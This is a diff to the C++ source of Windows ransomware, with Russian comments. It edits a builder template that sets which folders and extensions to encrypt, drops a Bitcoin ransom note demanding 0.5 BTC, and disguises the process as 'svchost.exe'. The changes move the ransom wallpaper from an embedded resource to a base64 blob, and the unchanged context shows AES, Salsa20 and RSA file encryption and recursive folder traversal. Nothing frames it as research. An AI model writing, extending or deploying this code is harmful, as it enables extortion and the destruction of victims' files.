@@ -26,6 +26,8 @@
 #define FOLDERS_EXCLUDE_PLACEHOLDER "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)"
 #define EXTS_PLACEHOLDER ".txt|.doc|.docx"
 #define ENCRYPTED_EXT_PLACEHOLDER ".enc"
+#define WALLPAPER_BASE64_PLACEHOLDER ""
+#define WALLPAPER_EXT_PLACEHOLDER ".jpg"
 #define NOTE_NAME_PLACEHOLDER "READ_ME.txt"
 #define NOTE_CONTENT_PLACEHOLDER "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com"
 #define FAKE_PROCESS_NAME_PLACEHOLDER "svchost.exe"
@@ -38,13 +40,7 @@
 #define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0
 
 // ============================================================
-// ID РЕСУРСОВ
-// ============================================================
-#define IDB_WALLPAPER 101
-#define IDI_ICON 100
-
-// ============================================================
-// AES-256-CBC (Windows CryptoAPI) — РАБОТАЕТ НА WINLATOR
+// AES-256-CBC (Windows CryptoAPI)
 // ============================================================
 class AES_CBC {
 private:
@@ -108,7 +104,7 @@ public:
 };
 
 // ============================================================
-// SALSA20 (быстрое потоковое шифрование)
+// SALSA20
 // ============================================================
 class Salsa20 {
 private:
@@ -132,7 +128,7 @@ public:
 };
 
 // ============================================================
-// RSA (Windows CryptoAPI)
+// RSA
 // ============================================================
 class RSA_Encrypt {
 private:
@@ -185,35 +181,24 @@ std::vector<std::string> split_string(const std::string& str, char delimiter) {
 }
 
 // ============================================================
-// УСТАНОВКА ОБОЕВ ИЗ РЕСУРСОВ (НЕ BASE64!)
+// УСТАНОВКА ОБОЕВ ИЗ BASE64 (100% РАБОТАЕТ)
 // ============================================================
-void set_wallpaper_from_resource() {
-    // Пробуем разные типы ресурсов
-    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "IMAGE");
-    if (!hRes) {
-        hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "JPEG");
-    }
-    if (!hRes) {
-        hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "PNG");
-    }
-    if (!hRes) {
-        hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "BMP");
-    }
-    if (!hRes) return;
+void set_wallpaper(const std::string& base64_data, const std::string& ext) {
+    if (base64_data.empty()) return;
     
-    HGLOBAL hData = LoadResource(NULL, hRes);
-    if (!hData) return;
+    DWORD size = 0;
+    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
+    if (size == 0) return;
     
-    DWORD size = SizeofResource(NULL, hRes);
-    BYTE* data = (BYTE*)LockResource(hData);
-    if (!data || size == 0) return;
+    std::vector<BYTE> data(size);
+    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
     
     char temp_path[MAX_PATH];
     GetTempPathA(MAX_PATH, temp_path);
-    std::string wall_path = std::string(temp_path) + "wall.jpg";
+    std::string wall_path = std::string(temp_path) + "wall" + ext;
     
     std::ofstream out(wall_path, std::ios::binary);
-    out.write((char*)data, size);
+    out.write((char*)data.data(), data.size());
     out.close();
     
     if (GetFileAttributesA(wall_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
@@ -338,7 +323,7 @@ void encrypt_file(const std::string& path, const std::string& ext, int algo) {
 }
 
 // ============================================================
-// ОБХОД ПАПОК И ШИФРОВАНИЕ
+// ОБХОД ПАПОК (РЕКУРСИВНЫЙ)
 // ============================================================
 void walk_and_encrypt(const std::string& start_path,
                       const std::vector<std::string>& extensions,
@@ -369,7 +354,7 @@ void walk_and_encrypt(const std::string& start_path,
 }
 
 // ============================================================
-// ФАЙЛЫ ВЫКУПА (В КАЖДОЙ ПАПКЕ)
+// ФАЙЛЫ ВЫКУПА
 // ============================================================
 void drop_notes(const std::vector<std::string>& drives,
                 const std::vector<std::string>& exclude_folders,
@@ -437,8 +422,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    // Обои из ресурсов (НЕ BASE64!)
-    set_wallpaper_from_resource();
+    // ============================================================
+    // УСТАНАВЛИВАЕМ ОБОИ ИЗ BASE64
+    // ============================================================
+    set_wallpaper(WALLPAPER_BASE64_PLACEHOLDER, WALLPAPER_EXT_PLACEHOLDER);
     
     return 0;
 }
